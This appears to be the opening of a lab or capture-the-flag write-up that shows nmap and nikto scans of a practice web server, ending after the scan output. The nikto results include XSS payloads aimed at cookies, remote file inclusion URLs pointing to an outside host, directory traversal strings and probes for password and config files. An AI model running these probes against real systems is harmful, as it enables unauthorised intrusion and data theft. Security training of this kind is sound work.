

<br>

<h2 align="center">Port Scanning</h2>



<br>



```bash
:~/challenge# nmap -sC -sV -T4 -Pn -p22,80 10.65.175.77
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-15 19:07 UTC
Nmap scan report for ip-10-65-175-77.ec2.internal (10.65.175.77)
Host is up (0.00035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 12:d1:25:03:71:12:81:f3:d2:4f:fe:07:13:57:3c:fa (RSA)
|   256 0b:15:76:b8:58:62:e8:ff:8f:5d:e3:f1:99:bd:cc:db (ECDSA)
|_  256 0e:08:74:b3:c2:de:f6:c2:aa:41:8e:e0:f4:57:c9:b3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Whoami?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```

<br>
<br>
<br>
<h2 align="center">Vulnerability Scanning</h2>

```bash
:~/challenge# nikto -h http://10.65.175.77
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.65.175.77
+ Target Hostname:    ip-10-65-175-77.ec2.internal
+ Target Port:        80
+ Start Time:         2026-03-15 19:08:44 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x1f7 0x5ba0b8a8bee0a 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: index.html, index.php
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3233: /test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3092: /test.php: This might be interesting...
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-03-15 19:08:54 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


```bash
root@ip-10-65-115-1:~/challenge# nikto -h http://10.65.175.77/test.php
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.65.175.77
+ Target Hostname:    ip-10-65-175-77.ec2.internal
+ Target Port:        80
+ Start Time:         2026-03-15 19:09:24 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 4 entries which should be manually viewed.
+ lines
+ /crossdomain.xml contains 0 line which should be manually viewed for improper domains or wildcards.
+ Multiple index files found: index.cgi, index.shtml, index.aspx, index.html, default.asp, index.do, index.php, index.cfm, index.asp, default.htm, index.php3, index.jhtml, default.aspx, index.htm, index.pl
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
+ /test.php/kboard/: KBoard Forum 0.3.0 and prior have a security problem in forum_edit_post.php, forum_post.php and forum_reply.php
+ /test.php/lists/admin/: PHPList pre 2.6.4 contains a number of vulnerabilities including remote administrative access, harvesting user info and more. Default login to admin interface is admin/phplist
+ /test.php/splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+ /test.php/ssdefs/: Siteseed pre 1.4.2 has 'major' security problems.
+ /test.php/sshome/: Siteseed pre 1.4.2 has 'major' security problems.
+ /test.php/tiki/: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
+ /test.php/tiki/tiki-install.php: Tiki 1.7.2 and previous allowed restricted Wiki pages to be viewed via a 'URL trick'. Default login/pass could be admin/admin
+ /test.php/scripts/samples/details.idc: See RFP 9901; www.wiretrip.net
+ OSVDB-396: /test.php/_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-637: /test.php/~root/: Allowed to browse root's home directory.
+ /test.php/cgi-bin/wrap: comes with IRIX 6.2; allows to view directories
+ /test.php/forums//admin/config.php: PHP Config file may contain database IDs and passwords.
+ /test.php/forums//adm/config.php: PHP Config file may contain database IDs and passwords.
+ /test.php/forums//administrator/config.php: PHP Config file may contain database IDs and passwords.
+ /test.php/forums/config.php: PHP Config file may contain database IDs and passwords.
+ /test.php/guestbook/guestbookdat: PHP-Gastebuch 1.60 Beta reveals sensitive information about its configuration.
+ /test.php/guestbook/guestbookdat: PHP-Gastebuch 1.60 Beta reveals sensitive information about its configuration.
+ /test.php/guestbook/pwd: PHP-Gastebuch 1.60 Beta reveals the md5 hash of the admin password.
+ /test.php/help/: Help directory should not be accessible
+ OSVDB-2411: /test.php/hola/admin/cms/htmltags.php?datei=./sec/data.php: hola-cms-1.2.9-10 may reveal the administrator ID and password.
+ OSVDB-3233: /test.php/horde/test.php?mode=phpinfo: Horde allows phpinfo() to be run, which gives detailed system information.
+ OSVDB-3233: /test.php/imp/horde/test.php?mode=phpinfo: Horde allows phpinfo() to be run, which gives detailed system information.
+ OSVDB-8103: /test.php/global.inc: PHP-Survey's include file should not be available via the web. Configure the web server to ignore .inc files or change this to global.inc.php
+ OSVDB-59620: /test.php/inc/common.load.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
+ OSVDB-59619: /test.php/inc/config.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
+ OSVDB-59618: /test.php/inc/dbase.php: Bookmark4U v1.8.3 include files are not protected and may contain remote source injection by using the 'prefix' variable.
+ OSVDB-2703: /test.php/geeklog/users.php: Geeklog prior to 1.3.8-1sr2 contains a SQL injection vulnerability that lets a remote attacker reset admin password.
+ OSVDB-8204: /test.php/gb/index.php?login=true: gBook may allow admin login by setting the value 'login' equal to 'true'.
+ /test.php/guestbook/admin.php: Guestbook admin page available without authentication.
+ /test.php/getaccess: This may be an indication that the server is running getAccess for SSO
+ OSVDB-5292: /test.php/filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt?: Some versions of PHProjekt allow remote file inclusions. Verify the current version is running. See http://www.securiteam.com/unixfocus/5PP0F1P6KS.html for more info
+ /test.php/cfdocs/expeval/openfile.cfm: Can use to expose the system/server path.
+ /test.php/tsweb/: Microsoft TSAC found. http://www.dslwebserver.com/main/fr_index.html?/main/sbs-Terminal-Services-Advanced-Client-Configuration.html
+ /test.php/vgn/performance/TMT: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/performance/TMT/Report: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/performance/TMT/Report/XML: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/performance/TMT/reset: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/ppstats: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/previewer: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/record/previewer: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/stylepreviewer: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/vr/Deleting: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/vr/Editing: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/vr/Saving: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/vr/Select: Vignette CMS admin/maintenance script available.
+ /test.php/scripts/iisadmin/bdir.htr: This default script shows host info, may allow file browsing and buffer a overrun in the Chunked Encoding data transfer mechanism, request /scripts/iisadmin/bdir.htr??c:\<dirs> . http://www.microsoft.com/technet/security/bulletin/MS02-028.asp. http://www.cert.org/advisories/CA-2002-09.html.
+ /test.php/scripts/iisadmin/ism.dll: Allows you to mount a brute force attack on passwords
+ /test.php/scripts/tools/ctss.idc: This CGI allows remote users to view and modify SQL DB contents, server paths, docroot and more.
+ /test.php/bigconf.cgi: BigIP Configuration CGI
+ /test.php/blah_badfile.shtml: Allaire ColdFusion allows JSP source viewed through a vulnerable SSI call.
+ OSVDB-4910: /test.php/vgn/style: Vignette server may reveal system information through this file.
+ OSVDB-17653: /test.php/SiteServer/Admin/commerce/foundation/domain.asp: Displays known domains of which that server is involved.
+ OSVDB-17654: /test.php/SiteServer/Admin/commerce/foundation/driver.asp: Displays a list of installed ODBC drivers.
+ OSVDB-17655: /test.php/SiteServer/Admin/commerce/foundation/DSN.asp: Displays all DSNs configured for selected ODBC drivers.
+ OSVDB-17652: /test.php/SiteServer/admin/findvserver.asp: Gives a list of installed Site Server components.
+ /test.php/SiteServer/Admin/knowledge/dsmgr/default.asp: Used to view current search catalog configurations
+ /test.php/SiteServer/Admin/knowledge/dsmgr/default.asp: Used to view current search catalog configurations
+ /test.php/basilix/mbox-list.php3: BasiliX webmail application prior to 1.1.1 contains a XSS issue in 'message list' function/page
+ /test.php/basilix/message-read.php3: BasiliX webmail application prior to 1.1.1 contains a XSS issue in 'read message' function/page
+ /test.php/clusterframe.jsp: Macromedia JRun 4 build 61650 remote administration interface is vulnerable to several XSS attacks.
+ /test.php/IlohaMail/blank.html: IlohaMail 0.8.10 contains a XSS vulnerability. Previous versions contain other non-descript vulnerabilities.
+ /test.php/bb-dnbd/faxsurvey: This may allow arbitrary command execution.
+ /test.php/cartcart.cgi: If this is Dansie Shopping Cart 3.0.8 or earlier, it contains a backdoor to allow attackers to execute arbitrary commands.
+ OSVDB-6591: /test.php/scripts/Carello/Carello.dll: Carello 1.3 may allow commands to be executed on the server by replacing hidden form elements. This could not be tested by Nikto.
+ /test.php/scripts/tools/dsnform.exe: Allows creation of ODBC Data Source
+ /test.php/scripts/tools/dsnform: Allows creation of ODBC Data Source
+ OSVDB-17656: /test.php/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp: Used to create, modify, and potentially delete LDAP users and groups.
+ OSVDB-17657: /test.php/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp: Used to create, modify, and potentially delete LDAP users and groups.
+ /test.php/prd.i/pgen/: Has MS Merchant Server 1.0
+ /test.php/readme.eml: Remote server may be infected with the Nimda virus.
+ /test.php/scripts/httpodbc.dll: Possible IIS backdoor found.
+ /test.php/scripts/proxy/w3proxy.dll: MSProxy v1.0 installed
+ /test.php/SiteServer/admin/: Site Server components admin. Default account may be 'LDAP_Anonymous', pass is 'LdapPassword_1'. see http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm
+ /test.php/siteseed/: Siteseed pre 1.4.2 has 'major' security problems.
+ /test.php/pccsmysqladm/incs/dbconnect.inc: This file should not be accessible, as it contains database connectivity information. Upgrade to version 1.2.5 or higher.
+ /test.php/iisadmin/: Access to /iisadmin should be restricted to localhost or allowed hosts only.
+ /test.php/PDG_Cart/oder.log: Shopping cart software log
+ /test.php/ows/restricted%2eshow: OWS may allow restricted files to be viewed by replacing a character with its encoded equivalent.
+ /test.php/WEB-INF./web.xml: Multiple implementations of j2ee servlet containers allow files to be retrieved from WEB-INF by appending a '.' to the directory name. Products include Sybase EA Service, Oracle Containers, Orion, JRun, HPAS, Pramati and others. See http://www.westpoint.l
+ /test.php/view_source.jsp: Resin 2.1.2 view_source.jsp allows any file on the system to be viewed by using \..\ directory traversal. This script may be vulnerable.
+ /test.php/w-agora/: w-agora pre 4.1.4 may allow a remote user to execute arbitrary PHP scripts via URL includes in include/*.php and user/*.php files. Default account is 'admin' but password set during install.
+ OSVDB-42680: /test.php/vider.php3: MySimpleNews may allow deleting of news items without authentication.
+ OSVDB-6181: /test.php/officescan/cgi/cgiChkMasterPwd.exe: Trend Micro Officescan allows you to skip the login page and access some CGI programs directly.
+ /test.php/pbserver/pbserver.dll: This may contain a buffer overflow. http://www.microsoft.com/technet/security/bulletin/http://www.microsoft.com/technet/security/bulletin/ms00-094.asp.asp
+ /test.php/administrator/gallery/uploadimage.php: Mambo PHP Portal/Server 4.0.12 BETA and below may allow upload of any file type simply putting '.jpg' before the real file extension.
+ /test.php/pafiledb/includes/team/file.php: paFileDB 3.1 and below may allow file upload without authentication.
+ /test.php/phpEventCalendar/file_upload.php: phpEventCalendar 1.1 and prior are vulnerable to file upload bug.
+ /test.php/servlet/com.unify.servletexec.UploadServlet: This servlet allows attackers to upload files to the server.
+ /test.php/scripts/cpshost.dll: Posting acceptor possibly allows you to upload files
+ /test.php/upload.asp: An ASP page that allows attackers to upload files to server
+ /test.php/uploadn.asp: An ASP page that allows attackers to upload files to server
+ /test.php/uploadx.asp: An ASP page that allows attackers to upload files to server
+ /test.php/wa.exe: An ASP page that allows attackers to upload files to server
+ /test.php/basilix/compose-attach.php3: BasiliX webmail application prior to 1.1.1 contains a non-descript security vulnerability in compose-attach.php3 related to attachment uploads
+ /test.php/server/: If port 8000, Macromedia JRun 4 build 61650 remote administration interface is vulnerable to several XSS attacks.
+ /test.php/vgn/ac/data: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/ac/delete: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/ac/edit: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/ac/esave: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/ac/fsave: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/ac/index: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/asp/MetaDataUpdate: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/asp/previewer: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/asp/status: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/asp/style: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/errors: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/controller: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/errorpage: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/initialize: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/jspstatus: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/jspstatus56: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/metadataupdate: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/previewer: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/jsp/style: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/legacy/edit: Vignette CMS admin/maintenance script available.
+ /test.php/vgn/login: Vignette server may allow user enumeration based on the login attempts to this file.
+ OSVDB-35707: /test.php/forum/admin/wwforum.mdb: Web Wiz Forums password database found.
+ /test.php/fpdb/shop.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web.
+ OSVDB-52975: /test.php/guestbook/admin/o12guest.mdb: Ocean12 ASP Guestbook Manager allows download of SQL database which contains admin password.
+ OSVDB-15971: /test.php/midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server.
+ OSVDB-15971: /test.php/MIDICART/midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server.
+ OSVDB-41850: /test.php/mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb: MPCSoftWeb Guest Book passwords retrieved.
+ /test.php/news/news.mdb: Web Wiz Site News release v3.06 admin password database is available and unencrypted.
+ OSVDB-53413: /test.php/shopping300.mdb: VP-ASP shopping cart application allows .mdb files (which may include customer data) to be downloaded via the web. These should not be available.
+ OSVDB-53413: /test.php/shopping400.mdb: VP-ASP shopping cart application allows .mdb files (which may include customer data) to be downloaded via the web. These should not be available.
+ OSVDB-15971: /test.php/shoppingdirectory/midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server.
+ OSVDB-4398: /test.php/database/db2000.mdb: Max Web Portal database is available remotely. It should be moved from the default location to a directory outside the web root.
+ /test.php/admin/config.php: PHP Config file may contain database IDs and passwords.
+ /test.php/adm/config.php: PHP Config file may contain database IDs and passwords.
+ /test.php/administrator/config.php: PHP Config file may contain database IDs and passwords.
+ /test.php/contents.php?new_language=elvish&mode=select: Requesting a file with an invalid language selection from DC Portal may reveal the system path.
+ OSVDB-6467: /test.php/pw/storemgr.pw: Encrypted ID/Pass for Mercantec's SoftCart, http://www.mercantec.com/, see http://www.mindsec.com/advisories/post2.txt for more information.
+ /test.php/servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter: Allaire ColdFusion allows JSP source viewed through a vulnerable SSI call.
+ /test.php/shopa_sessionlist.asp: VP-ASP shopping cart test application is available from the web. This page may give the location of .mdb files which may also be available.
+ OSVDB-53303: /test.php/simplebbs/users/users.php: Simple BBS 1.0.6 allows user information and passwords to be viewed remotely.
+ /test.php/typo3conf/: This may contain sensitive Typo3 files.
+ /test.php/typo3conf/database.sql: Typo3 SQL file found.
+ /test.php/typo3conf/localconf.php: Typo3 config file found.
+ OSVDB-53386: /test.php/vchat/msg.txt: VChat allows user information to be retrieved.
+ OSVDB-4907: /test.php/vgn/license: Vignette server license file found.
+ OSVDB-3233: /test.php/webamil/test.php?mode=phpinfo: Horde allows phpinfo() to be run, which gives detailed system information.
+ /test.php/webcart-lite/config/import.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web.
+ /test.php/webcart-lite/orders/import.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web.
+ /test.php/webcart/carts/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web.
+ /test.php/webcart/config/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web.
+ /test.php/webcart/config/clients.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web.
+ /test.php/webcart/orders/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web.
+ /test.php/webcart/orders/import.txt: This may allow attackers to read credit card data. Reconfigure to make this file not accessible via the web.
+ /test.php/ws_ftp.ini: Can contain saved passwords for FTP sites
+ /test.php/WS_FTP.ini: Can contain saved passwords for FTP sites
+ /test.php/_mem_bin/auoconfig.asp: Displays the default AUO (LDAP) schema, including host and port.
+ /test.php/_mem_bin/auoconfig.asp: LDAP information revealed via asp. See http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm
+ OSVDB-17659: /test.php/SiteServer/Admin/knowledge/persmbr/vs.asp: Expose various LDAP service and backend configuration parameters
+ OSVDB-17661: /test.php/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp: Expose various LDAP service and backend configuration parameters
+ OSVDB-17662: /test.php/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp: Expose various LDAP service and backend configuration parameters
+ OSVDB-17660: /test.php/SiteServer/Admin/knowledge/persmbr/VsTmPr.asp: Expose various LDAP service and backend configuration parameters
+ /test.php/tvcs/getservers.exe?action=selects1: Following steps 2-4 of this page may reveal a zip file that contains passwords and system details.
+ /test.php/whatever.htr: May reveal physical path. htr files may also be vulnerable to an off-by-one overflow that allows remote command execution (see http://www.microsoft.com/technet/security/bulletin/MS02-018.asp)
+ /test.php/nsn/fdir.bas:ShowVolume: You can use ShowVolume and ShowDirectory directly on the Novell server (NW5.1) to view the filesystem without having to log in
+ /test.php/nsn/fdir.bas: You can use fdir to ShowVolume and ShowDirectory.
+ /test.php/forum/admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein
+ /test.php/webmail/blank.html: IlohaMail 0.8.10 contains an XSS vulnerability. Previous versions contain other non-descript vulnerabilities.
+ /test.php/jamdb/: JamDB pre 0.9.2 mp3.php and image.php can allow user to read arbitrary file out of docroot.
+ OSVDB-1201: /test.php/cgi/cgiproc?: It may be possible to crash Nortel Contivity VxWorks by requesting '/cgi/cgiproc?$' (not attempted!). Upgrade to version 2.60 or later.
+ OSVDB-6196: /test.php/servlet/SchedulerTransfer: PeopleSoft SchedulerTransfer servlet found, which may allow remote command execution. See http://www.iss.net/issEn/delivery/xforce/alertdetail.jsp?oid=21999
+ /test.php/servlet/sunexamples.BBoardServlet: This default servlet lets attackers execute arbitrary commands.
+ OSVDB-6196: /test.php/servlets/SchedulerTransfer: PeopleSoft SchedulerTransfer servlet found, which may allow remote command execution. See http://www.iss.net/issEn/delivery/xforce/alertdetail.jsp?oid=21999
+ /test.php/perl/-e%20print%20Hello: The Perl interpreter on the Novell system may allow any command to be executed. See http://www.securityfocus.com/bid/5520. Installing Perl 5.6 might fix this issue.
+ /test.php/vgn/legacy/save: Vignette Legacy Tool may be unprotected. To access this resource, set a cookie called 'vgn_creds' with any value.
+ /test.php/IDSWebApp/IDSjsp/Login.jsp: Tivoli Directory Server Web Administration.
+ OSVDB-6466: /test.php/quikstore.cfg: Shopping cart config file, http://www.quikstore.com/, http://www.mindsec.com/advisories/post2.txt
+ /test.php/quikstore.cgi: A shopping cart.
+ /test.php/securecontrolpanel/: Web Server Control Panel
+ /test.php/siteminder: This may be an indication that the server is running Siteminder for SSO
+ /test.php/webmail/: Web based mail package installed.
+ /test.php/_cti_pvt/: FrontPage directory found.
+ /test.php/smg_Smxcfg30.exe?vcc=3560121183d3: This may be a Trend Micro Officescan 'backdoor'.
+ /test.php/nsn/..%5Cutil/attrib.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/chkvol.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/copy.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/del.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/dir.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/dsbrowse.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/glist.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/lancard.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/md.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/rd.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/ren.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server 
+ /test.php/nsn/..%5Cutil/send.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/set.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/slist.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/type.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cutil/userlist.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cweb/env.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cweb/fdir.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cwebdemo/env.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ /test.php/nsn/..%5Cwebdemo/fdir.bas: Netbase util access is possible which means that several utility scripts might be run (including directory listings, NDS tree enumeration and running .bas files on server
+ OSVDB-19767: /test.php/wikihome/action/conflict.php?TemplateDir=http://cirt.net/rfiinc.txt?: Some versions of WikkiTikkiTavi allow external source to be included.
+ /test.php/upd/: WASD Server can allow directory listings by requesting /upd/directory/. Upgrade to a later version and secure according to the documents on the WASD web site.
+ /test.php/CVS/Entries: CVS Entries file may contain directory listing information.
+ OSVDB-8450: /test.php/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. http://www.securityfocus.com/bid/7963.
+ OSVDB-8450: /test.php/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. http://www.securityfocus.com/bid/7963.
+ OSVDB-8450: /test.php/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. http://www.securityfocus.com/bid/7963.
+ OSVDB-8450: /test.php/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. http://www.securityfocus.com/bid/7963.
+ OSVDB-8450: /test.php/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. http://www.securityfocus.com/bid/7963.
+ /test.php/catalog.nsf: A list of server databases can be retrieved, as well as a list of ACLs.
+ /test.php/cersvr.nsf: Server certificate data can be accessed remotely.
+ /test.php/domlog.nsf: The domain server logs can be accessed remotely.
+ /test.php/events4.nsf: The events log can be accessed remotely.
+ /test.php/log.nsf: The server log is remotely accessible.
+ /test.php/names.nsf: User names and groups can be accessed remotely (possibly password hashes as well)
+ OSVDB-31150: /test.php/LOGIN.PWD: MIPCD password file (passwords are not encrypted). MIPDCD should not have the web interface enabled.
+ OSVDB-31150: /test.php/USER/CONFIG.AP: MIPCD configuration information. MIPCD should not have the web interface enabled.
+ /test.php/admin-serv/config/admpw: This file contains the encrypted Netscape admin password. It should not be accessible via the web.
+ /test.php/cgi-bin/cgi_process: WASD reveals a lot of system information in this script. It should be removed.
+ /test.php/ht_root/wwwroot/-/local/httpd$map.conf: WASD reveals the http configuration file. Upgrade to a later version and secure according to the documents on the WASD web site.
+ /test.php/local/httpd$map.conf: WASD reveals the http configuration file. Upgrade to a later version and secure according to the documents on the WASD web site.
+ /test.php/tree: WASD Server reveals the entire web root structure and files via this URL. Upgrade to a later version and secure according to the documents on the WASD web site.
+ /test.php/852566C90012664F: This database can be read using the replica ID without authentication.
+ /test.php/hidden.nsf: This database can be read without authentication. Common database name.
+ /test.php/mail.box: The mail database can be read without authentication.
+ /test.php/setup.nsf: The server can be configured remotely, or current setup can be downloaded.
+ /test.php/statrep.nsf: Any reports generated by the admins can be retrieved.
+ /test.php/webadmin.nsf: The server admin database can be accessed remotely.
+ /test.php/examples/servlet/AUX: Apache Tomcat versions below 4.1 may be vulnerable to DoS by repeatedly requesting this file.

+ /test.php/Config1.htm: This may be a D-Link. Some devices have a DoS condition if an oversized POST request is sent. This DoS was not tested. See http://www.phenoelit.de/stuff/dp-300.txt for info.

+ /test.php/contents/extensions/asp/1: The IIS system may be vulnerable to a DOS, see http://www.microsoft.com/technet/security/bulletin/MS02-018.asp for details.

+ /test.php/WebAdmin.dll?View=Logon: Some versions of WebAdmin are vulnerable to a remote DoS (not tested). See http://www.ngssoftware.com.

+ /test.php/cgi-win/cgitest.exe: This CGI may allow the server to be crashed remotely, see http://www.securityoffice.net/ for details.  Remove this default CGI.

+ /test.php/cgi-shl/win-c-sample.exe: win-c-sample.exe has a buffer overflow

+ /test.php/.nsf/../winnt/win.ini: This win.ini file can be downloaded.

+ /test.php/................../config.sys: PWS allows files to be read by prepending multiple '.' characters.  At worst, IIS, not PWS, should be used.

+ /test.php///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.

+ /test.php/..\..\..\..\..\..\temp\temp.class: Cisco ACS 2.6.x and 3.0.1 (build 40) allows authenticated remote users to retrieve any file from the system. Upgrade to the latest version.

+ OSVDB-728: /test.php/admentor/adminadmin.asp: Version 2.11 of AdMentor is vulnerable to SQL injection during login, in the style of: ' or =

+ OSVDB-10107: /test.php/author.asp: May be FactoSystem CMS, which could include SQL injection problems that could not be tested remotely.

+ OSVDB-27071: /test.php/phpimageview.php?pic=javascript:alert(8754): PHP Image View 1.0 is vulnerable to Cross Site Scripting (XSS).  http://www.cert.org/advisories/CA-2000-02.html.

+ OSVDB-2767: /test.php/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>: OpenAutoClassifieds 1.0 is vulnerable to a XSS attack

+ OSVDB-3931: /test.php/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.

+ /test.php/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.

+ /test.php/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.

